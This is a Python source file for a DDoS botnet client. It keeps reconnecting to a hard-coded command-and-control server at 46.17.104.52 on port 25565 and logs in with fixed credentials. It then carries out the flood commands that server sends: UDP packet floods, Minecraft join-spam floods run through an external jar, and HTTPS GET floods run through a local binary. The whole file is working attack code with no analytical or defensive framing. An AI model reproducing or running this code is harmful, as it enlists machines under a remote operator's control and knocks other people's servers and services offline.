import socket
import time
import random
import subprocess
import threading

def attack_udp(ip, port, secs, size):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(size)
    dport_range = range(1, 65536) if port == 0 else [port]
    end_time = time.time() + secs
    while time.time() < end_time:
        try:
            s.sendto(payload, (ip, random.choice(dport_range)))
        except:
            continue

def attack_minecraft(ip, port, secs, protocol):
    command = f"java -jar minecraft.jar {ip}:{port} {protocol} spamjoin {secs} 2000"
    subprocess.run(command, shell=True)

def attack_https(url, secs):
    command = f"./https GET {url} {secs} 1 32 http.txt"
    subprocess.run(command, shell=True)

def connect():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect(('46.17.104.52', 25565))
            print("Ok.")
            for match, reply in [('Username', 'BOT'), ('Password', '\xff\xff\xff\xff\75')]:
                while True:
                    if match in c2.recv(1024).decode():
                        c2.send(reply.encode('cp1252' if 'Password' in match else 'utf-8'))
                        break
            return c2
        except Exception as e:
            print("Error.")
            time.sleep(5)

def parse_and_attack(c2):
    while True:
        try:
            data = c2.recv(1024).decode().strip()
            if not data:
                break
            if data == 'PING':
                c2.send(b'PONG')
                continue

            args = data.split()
            cmd = args[0].upper()
            ip = args[1]
            port = int(args[2]) if len(args) > 2 else 0
            secs = int(args[3]) if len(args) > 3 else 60
            size = int(args[4]) if len(args) > 4 else 1024
            protocol = args[5] if len(args) > 5 else '754'

            attack_map = {
                '.UDP': (attack_udp, (ip, port, secs, size)),
                '.MINECRAFT': (attack_minecraft, (ip, port, secs, protocol)),
                '.HTTPS': (attack_https, (ip, secs)),
            }

            if cmd in attack_map:
                func, fargs = attack_map[cmd]
                threading.Thread(target=func, args=fargs, daemon=True).start()
        except Exception as e:
            print(f"Error: {e}")
            break

def main():
    while True:
        c2 = connect()
        parse_and_attack(c2)
        c2.close()

if __name__ == '__main__':
    main()
